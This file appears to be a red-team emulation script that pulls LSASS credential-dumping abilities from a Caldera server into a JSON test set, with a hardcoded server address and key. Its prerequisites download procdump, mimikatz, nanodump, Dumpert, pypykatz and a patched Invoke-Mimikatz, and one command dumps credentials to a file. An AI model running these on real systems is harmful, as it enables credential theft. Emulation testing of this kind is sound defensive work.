const CALDERA_URL = "http://10.1.99.1:8888"
const CALDERA_KEY = "ADMIN123"
const OUT_FILE = import.meta.dir + "/focusedTechniques.json"

const CATEGORIES = {
  "credential-access": [
    "T1003.001",
  ],
}

const VALID_TECHNIQUES = new Set(Object.values(CATEGORIES).flat())

const EXCLUDE_ABILITY_IDS = new Set([
  "bbc786e45aff314d33e60133f010f00c", // Dump LSASS.exe using lolbin rdrleakdiag.exe (doesn't produce files on Win11 22H2)
  "7049e3ec-b822-4fdf-a4ac-18190f9b66d1", // Powerkatz (Staged) — deprecated on Win11
  "baac2c6d-4652-4b7e-ab0a-f1bf246edd12", // Run PowerKatz — deprecated on Win11
  "82dcefb5c3512d73bf2248cb0127c4ae", // Powershell Mimikatz — deprecated on Win11
])

async function fetchAbilities() {
  const res = await fetch(`${CALDERA_URL}/api/rest`, {
    method: "POST",
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    body: JSON.stringify({ index: "abilities" }),
    signal: AbortSignal.timeout(30000),
  })
  if (!res.ok) throw new Error(`Caldera API error (${res.status}): ${await res.text()}`)
  return await res.json()
}

function hasWindowsExecutor(ability) {
  return ability.executors?.some(e => e.platform === "windows")
}

function filterExecutors(ability) {
  const hasPsh = ability.executors.some(e => e.name === "psh" && e.platform === "windows")
  const filtered = ability.executors.filter(e => e.platform === "windows")
  return {
    ...ability,
    executors: hasPsh ? filtered.filter(e => e.name === "psh") : filtered,
  }
}

function build() {
  const techniques = {}
  for (const cat of Object.keys(CATEGORIES)) {
    techniques[cat] = {}
    for (const tid of CATEGORIES[cat]) {
      techniques[cat][tid] = { technique_name: null, abilities: [] }
    }
  }

  return {
    categories: Object.keys(CATEGORIES),
    techniques,
  }
}

const PAYLOAD_DOWNLOADS = {
  "procdump.exe": {
    win_dest: "C:\\Users\\Public\\procdump.exe",
    win_steps: `Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/Procdump.zip' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\procdump64.exe' 'C:\\Users\\Public\\procdump.exe' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force`,
  },
  "Outflank-Dumpert.exe": {
    win_dest: "C:\\Users\\Public\\Outflank-Dumpert.exe",
    win_steps: `Invoke-WebRequest -Uri 'https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe' -OutFile 'C:\\Users\\Public\\Outflank-Dumpert.exe'`,
  },
  "nanodump.x64.exe": {
    win_dest: "C:\\Users\\Public\\nanodump.x64.exe",
    win_steps: `Invoke-WebRequest -Uri 'https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe' -OutFile 'C:\\Users\\Public\\nanodump.x64.exe'`,
  },
  "mimikatz.exe": {
    win_dest: "C:\\Users\\Public\\x64\\mimikatz.exe",
    win_steps: `New-Item -ItemType Directory -Force -Path 'C:\\Users\\Public\\x64'; Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile 'C:\\Users\\Public\\payload.zip'; Expand-Archive -Path 'C:\\Users\\Public\\payload.zip' -DestinationPath 'C:\\Users\\Public\\payload_extract' -Force; Copy-Item 'C:\\Users\\Public\\payload_extract\\x64\\mimikatz.exe' 'C:\\Users\\Public\\x64\\mimikatz.exe' -Force; Remove-Item 'C:\\Users\\Public\\payload.zip' -Force; Remove-Item 'C:\\Users\\Public\\payload_extract' -Recurse -Force`,
  },
  "pypykatz": {
    win_dest: null,
    replace_with: "pypykatz",
    win_steps: `Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe' -OutFile 'C:\\Users\\Public\\python_setup.exe'; Start-Process -FilePath 'C:\\Users\\Public\\python_setup.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1 Include_test=0' -Wait; Remove-Item 'C:\\Users\\Public\\python_setup.exe' -Force; $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User'); pip install pypykatz`,
  },
}

const CUSTOM_ABILITY_OVERRIDES = {
  "7049e3ec-b822-4fdf-a4ac-18190f9b66d1": {
    win_prereq: [
      `$dest = "C:\\Windows\\System32\\invoke-mimi.ps1"`,
      `if (-not (Test-Path $dest) -or (Get-Item $dest -ErrorAction SilentlyContinue).Length -eq 0) {`,
      `  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`,
      `  Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1" -OutFile $dest -UseBasicParsing`,
      `  $f = Get-Item $dest -ErrorAction Stop`,
      `  if ($f.Length -eq 0) { throw "invoke-mimi.ps1 downloaded but empty" }`,
      `  Write-Host "DEPLOYED $($f.Length) bytes"`,
      `} else {`,
      `  Write-Host "ALREADY_PRESENT: $dest"`,
      `}`,
      `$old = '$UnsafeNativeMethods.GetMethod(''GetProcAddress'')'`,
      `$new = '$UnsafeNativeMethods.GetMethod(''GetProcAddress'', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)'`,
      `$content = Get-Content $dest -Raw`,
      `$patched = $content.Replace($old, $new)`,
      `Set-Content $dest $patched -Encoding UTF8`,
      `Write-Host "PATCHED $dest"`,
    ].join("; "),
    command: `iex (Get-Content .\\invoke-mimi.ps1 -Raw);\nInvoke-Mimikatz -DumpCreds *>&1 | Out-File C:\\Windows\\Temp\\mimi-out.txt -Encoding UTF8;\nGet-Content C:\\Windows\\Temp\\mimi-out.txt`,
  },
}

const BUILTIN_TOOL_PREREQS = {
  "createdump.exe": {
    win_check_path: "$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe",
    win_steps: [
      `$url = "https://download.visualstudio.microsoft.com/download/pr/a0832b5a-6900-442b-af79-6ffddddd6ba4/e2df0b25dd851ee0b38a86947dd0e42e/dotnet-runtime-5.0.17-win-x64.exe"`,
      `$out = "$env:Temp\\dotnet-runtime-5.0.17.exe"`,
      `Invoke-WebRequest -Uri $url -OutFile $out`,
      `Start-Process -FilePath $out -ArgumentList "/install /quiet /norestart" -Wait`,
      `Remove-Item $out -Force`,
    ].join("; "),
  },
}

function extractPayloadFilename(command) {
  const patterns = [
    { re: /ExternalPayloads[\\/](?:x64[\\/])?mimikatz\.exe/i, key: "mimikatz.exe" },
    { re: /venv_t1003_001[\\/]Scripts[\\/]pypykatz/i, key: "pypykatz" },
    { re: /ExternalPayloads[\\/](?:x64[\\/])?([^\\/\"\s]+\.(?:exe|ps1|dll|bat|cmd))/i, key: null },
  ]
  for (const p of patterns) {
    const m = p.re.exec(command)
    if (m) return p.key || m[1]
  }
  return null
}

function enrichPayloads(ability) {
  const desc = ability.description || ""
  const cmds = ability.executors?.map(e => e.command || "").join("\n") || ""

  if (!desc.includes("PathToAtomicsFolder") && !cmds.includes("PathToAtomicsFolder")) {
    return ability
  }

  const hasPayloads = ability.executors?.some(e => (e.payloads || []).length > 0)
  if (hasPayloads) return ability

  const filename = extractPayloadFilename(cmds) || extractPayloadFilename(desc)
  if (!filename) return ability

  const info = PAYLOAD_DOWNLOADS[filename] || PAYLOAD_DOWNLOADS[Object.keys(PAYLOAD_DOWNLOADS).find(k => filename.includes(k))]
  if (!info) return ability

  const winSteps = info.win_dest
    ? `if (Test-Path "${info.win_dest}") { Write-Host "ALREADY_PRESENT: ${info.win_dest}" } else { ${info.win_steps} }`
    : info.win_steps

  const escapedFilename = filename.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
  const re = new RegExp(`"?PathToAtomicsFolder[^"\\s]*${escapedFilename}"?`)
  const replacement = info.replace_with || `"${info.win_dest}"`

  const executors = ability.executors.map(e => ({
    ...e,
    command: e.command.replace(re, replacement),
  }))

  return {
    ...ability,
    executors,
    win_prereq: winSteps,
  }
}

function enrichBuiltinToolPrereqs(ability) {
  const cmds = ability.executors?.map(e => e.command || "").join("\n") || ""

  for (const [tool, prereq] of Object.entries(BUILTIN_TOOL_PREREQS)) {
    if (!cmds.includes(tool)) continue

    const existingWin = ability.win_prereq ?? ""
    if (existingWin) return ability

    return {
      ...ability,
      win_prereq: `if (Test-Path "${prereq.win_check_path}") { Write-Host "ALREADY_PRESENT: ${prereq.win_check_path}" } else { ${prereq.win_steps} }`,
    }
  }
  return ability
}

function enrichCustom(ability) {
  const override = CUSTOM_ABILITY_OVERRIDES[ability.ability_id]
  if (!override) return ability
  const executors = ability.executors.map(e => {
    if (e.name === "psh" && e.platform === "windows") {
      return { ...e, command: override.command }
    }
    return e
  })
  return {
    ...ability,
    executors,
    win_prereq: override.win_prereq || ability.win_prereq || "",
  }
}

function strip(ability) {
  const executor = ability.executors?.[0] ?? {}
  return {
    ability_id: ability.ability_id,
    name: ability.name,
    description: ability.description ?? "",
    command: executor.command ?? "",
    win_prereq: ability.win_prereq ?? "",
  }
}

function normalizeName(name) {
  return name
    .toLowerCase()
    .replace(/\(cmd\)/gi, "")
    .replace(/\(powershell\)/gi, "")
    .replace(/- powershell/gi, "")
    .replace(/- cmd/gi, "")
    .replace(/via command prompt/gi, "")
    .replace(/via powershell/gi, "")
    .replace(/with powershell/gi, "")
    .replace(/with cmd/gi, "")
    .replace(/\s+/g, " ")
    .trim()
}

function deduplicate(abilities) {
  const pshOnly = abilities.filter(a => a.executors.every(e => e.name === "psh"))
  const cmdOnly = abilities.filter(a => a.executors.every(e => e.name === "cmd"))
  const mixed = abilities.filter(a => a.executors.some(e => e.name === "psh") && a.executors.some(e => e.name === "cmd"))

  const pshNames = new Set(pshOnly.map(a => normalizeName(a.name)))
  const keep = [...pshOnly, ...mixed]
  const removed = []

  for (const a of cmdOnly) {
    if (pshNames.has(normalizeName(a.name))) {
      removed.push(a.name)
    } else {
      keep.push(a)
    }
  }

  return { keep, removed }
}

async function main() {
  const abilities = await fetchAbilities()
  const filtered = abilities.filter(a => VALID_TECHNIQUES.has(a.technique_id) && hasWindowsExecutor(a))
  const result = build()

  for (const ability of filtered) {
    if (EXCLUDE_ABILITY_IDS.has(ability.ability_id)) continue

    const cat = ability.tactic
    const tid = ability.technique_id
    if (!result.techniques[cat]?.[tid]) continue

    if (!result.techniques[cat][tid].technique_name) {
      result.techniques[cat][tid].technique_name = ability.technique_name
    }

    const seen = result.techniques[cat][tid].abilities.map(a => a.ability_id)
    if (!seen.includes(ability.ability_id)) {
      result.techniques[cat][tid].abilities.push(enrichCustom(enrichBuiltinToolPrereqs(enrichPayloads(filterExecutors(ability)))))
    }
  }

  // Deduplicate: remove cmd-only abilities when a psh-only version exists
  let totalRemoved = 0
  for (const cat of result.categories) {
    for (const tid of Object.keys(result.techniques[cat])) {
      const { keep, removed } = deduplicate(result.techniques[cat][tid].abilities)
      if (removed.length > 0) {
        result.techniques[cat][tid].abilities = keep
        totalRemoved += removed.length
      }
    }
  }

  // Remove techniques with no abilities
  for (const cat of result.categories) {
    for (const tid of Object.keys(result.techniques[cat])) {
      if (result.techniques[cat][tid].abilities.length === 0) {
        delete result.techniques[cat][tid]
      }
    }
    if (Object.keys(result.techniques[cat]).length === 0) {
      delete result.techniques[cat]
    }
  }

  // Strip abilities to only needed fields
  for (const cat of result.categories) {
    const catTechs = result.techniques[cat]
    if (!catTechs) continue
    for (const tid of Object.keys(catTechs)) {
      catTechs[tid].abilities = catTechs[tid].abilities.map(strip)
    }
  }

  // Stats
  let totalAbilities = 0
  let totalTechs = 0
  for (const cat of result.categories) {
    if (!result.techniques[cat]) continue
    const techs = result.techniques[cat]
    totalTechs += Object.keys(techs).length
    for (const [tid, t] of Object.entries(techs)) {
      totalAbilities += t.abilities.length
      }
  }
  Bun.write(OUT_FILE, JSON.stringify(result, null, 2))
  const size = (Bun.file(OUT_FILE).size / 1024).toFixed(1)
  }

main().catch(err => {
  console.error("Error:", err.message)
  process.exit(1)
})
